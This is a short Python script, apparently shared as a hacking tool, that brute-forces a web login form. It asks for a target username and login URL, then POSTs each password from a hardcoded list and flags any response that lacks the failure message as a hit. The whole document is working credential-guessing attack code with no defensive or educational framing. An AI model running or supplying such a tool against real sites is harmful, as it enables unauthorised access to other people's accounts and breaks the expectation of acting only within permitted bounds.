import requests
import time
print(50*"-")
print("Note you can add your passwords in the code")
print(50*"-")
input_username = input("Enter User target: ")
input_url = input("Enter your Login Form: ")
print(30*"-")


url = f'{input_url}'

username = f'{input_username}'
passwords = ['123456','457708','admin','safdhgkjhl','sdgfdgk']
#Note in incoorect variable you must put the error 
#will appear when you enterd a wrong pass
incorrect = 'Incorrect Username or Password'
for p in passwords :
    info = {"username":username,"password":p}
    response = requests.post(url,data=info)

    if incorrect in response.text:
        print(f"[-] incorrect data : {username} | {p}")
    else:
        print(f"[+] found : {username} | {p}")

print(30*"-")
print("Created By Master")

 